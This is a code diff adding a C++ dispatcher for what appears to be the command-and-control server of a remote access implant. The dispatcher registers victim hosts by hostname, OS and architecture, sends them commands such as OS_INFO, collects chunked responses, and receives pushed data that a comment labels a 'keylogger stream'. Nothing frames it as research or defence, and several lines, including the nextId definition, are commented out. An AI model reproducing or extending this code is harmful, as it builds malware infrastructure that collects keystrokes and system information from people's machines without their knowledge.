@@ -1,0 +1,100 @@
+#include "dispatcher.hpp"
+
+void Dispatcher::dispatch(ClientSession& client, const Frame& frame) {
+  switch (frame.header.type) {
+    case MessageType::REGISTER:
+      onRegister(client, frame.payload);
+      break;
+    case MessageType::RESPONSE:
+      onResponse(frame.payload);
+      break;
+    case MessageType::DATA:
+      onData(frame.payload);
+      break;
+    // case MessageType::DISCONNECT:
+    //   m_running = false;
+    //   break;
+    case MessageType::ERROR:
+      onError(frame.payload);
+      break;
+    default:
+      sendError(ErrorType::UNKNOWN_TYPE, "Unexpected message type");
+  }
+}
+
+// ── Incoming handlers ────────────────────────────────────────
+
+// The first message from the client must always be REGISTER.
+// Once we know who it is, we kick off the command sequence.
+void Dispatcher::onRegister(ClientSession& client,const std::vector<std::uint8_t>& payload) {
+  RegisterPayload clientInfo = ProtocolParser::parseRegisterPayload(payload);
+  client.setClientInfo(clientInfo);
+
+  std::cout << "[← REGISTER] hostname=" << clientInfo.hostname
+            << "  os=" << static_cast<int>(clientInfo.os_type)
+            << "  arch=" << static_cast<int>(clientInfo.arch) << "\n";
+
+  // First command: ask the client for OS info.
+  sendCommand(CommandType::OS_INFO);
+}
+
+// A RESPONSE carries the same id as the COMMAND it answers,
+// plus chunk metadata for large payloads split across messages.
+void Dispatcher::onResponse(const std::vector<std::uint8_t>& payload) {
+  const auto rsp = ProtocolParser::parseResponsePayload(payload);
+  std::cout << "[← RESPONSE] id=" << rsp.id
+            << "  chunk=" << static_cast<int>(rsp.chunk_index) + 1 << "/"
+            << static_cast<int>(rsp.total_chunks)
+            << "  status=" << static_cast<int>(rsp.status) << "\n"
+            << rsp.data << "\n";
+
+  // Only act once all chunks of this response have arrived.
+  const bool lastChunk = rsp.chunk_index + 1 == rsp.total_chunks;
+  if (lastChunk) sendDisconnect();
+  // → To send more commands, push them here instead of disconnecting.
+}
+
+// DATA messages are pushed by the client without a prior COMMAND
+// (e.g. keylogger stream). Handle them independently of the
+// request/response cycle.
+void Dispatcher::onData(const std::vector<std::uint8_t>& payload) {
+  const auto data = ProtocolParser::parseDataPayload(payload);
+  std::cout << "[← DATA] subtype=" << static_cast<int>(data.subtype) << "\n"
+            << data.data << "\n";
+}
+
+void Dispatcher::onError(const std::vector<std::uint8_t>& payload) {
+  const auto err = ProtocolParser::parseErrorPayload(payload);
+  std::cerr << "[← ERROR] code=" << static_cast<int>(err.code)
+            << "  msg=" << err.message << "\n";
+//   m_running = false; 
+}
+
+// ── Outgoing senders ─────────────────────────────────────────
+
+void Dispatcher::sendCommand(CommandType type, const std::string& data) {
+  CommandPayload cmd;
+  cmd.id = nextId();
+  cmd.type = type;
+  cmd.data = data;
+  const auto payload = ProtocolSerializer::serializeCommandPayload(cmd);
+  sendRaw(MessageType::COMMAND, payload);
+  std::cout << "[→ COMMAND] id=" << cmd.id
+            << "  type=" << static_cast<int>(cmd.type) << "\n";
+}
+
+void Dispatcher::sendError(ErrorType code, const std::string& msg) {
+  ErrorPayload err;
+  err.code = code;
+  err.message = msg;
+  const auto payload = ProtocolSerializer::serializeErrorPayload(err);
+  sendRaw(MessageType::ERROR, payload);
+}
+
+void Dispatcher::sendDisconnect() {
+  sendRaw(MessageType::DISCONNECT);
+  std::cout << "[→ DISCONNECT]\n";
+//   m_running = false;
+}
+
+// std::uint16_t Dispatcher::nextId() { return m_nextCmdId++; }
